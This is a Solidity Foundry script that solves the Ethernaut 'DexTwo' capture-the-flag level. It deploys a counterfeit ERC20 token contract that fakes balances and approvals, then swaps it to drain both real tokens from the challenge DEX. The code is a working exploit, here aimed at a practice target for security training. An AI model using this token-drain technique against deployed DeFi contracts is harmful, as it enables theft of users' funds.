// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {DexTwo} from "./Problem.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Solution {
    address referenceToken;

    function drainIt(DexTwo _dex, bool _isToken1) public {
        address inputToken = address(this);
        address outputToken = _isToken1 ? _dex.token1() : _dex.token2();
        referenceToken = outputToken;
        uint256 outputBalance = _dex.balanceOf(outputToken, address(_dex));

        _dex.swap(inputToken, outputToken, outputBalance);

        IERC20(outputToken).transfer(msg.sender, outputBalance);
    }

    function balanceOf(address _owner) public view returns (uint256) {
        if (_owner == address(this)) {
            return type(uint256).max;
        } else {
            return DexTwo(msg.sender).balanceOf(referenceToken, msg.sender);
        }
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool) {
        return true;
    }

    fallback() external {}
}

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        DexTwo dex = DexTwo(_instanceAddress);
        address token1 = dex.token1();
        address token2 = dex.token2();

        vm.startBroadcast();
        Solution solution = new Solution();

        solution.drainIt(dex, true);
        assert(dex.balanceOf(token1, address(dex)) == 0);

        solution.drainIt(dex, false);
        assert(dex.balanceOf(token2, address(dex)) == 0);

        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns (address) {
        return _getContractAddress("23");
    }
}
